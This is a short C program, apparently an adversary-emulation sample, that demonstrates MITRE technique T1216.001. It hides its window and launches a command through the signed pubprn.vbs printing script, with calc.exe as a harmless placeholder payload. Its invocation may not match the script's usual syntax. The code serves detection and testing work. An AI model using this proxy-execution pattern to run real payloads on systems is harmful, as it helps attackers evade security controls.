// Link      = https://attack.mitre.org/techniques/T1216/001/
// Technique = System Script Proxy Execution: PubPrn
// ID        = T1216.001
// Tactics   = Defense Evasion

#include <windows.h>

int main() {
    ShellExecuteA(
        NULL,
        "open",
        "cmd.exe",
        "cscript.exe C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 script \"cmd.exe /c calc.exe\"",
        NULL,
        SW_HIDE
    );

    return 0;
}




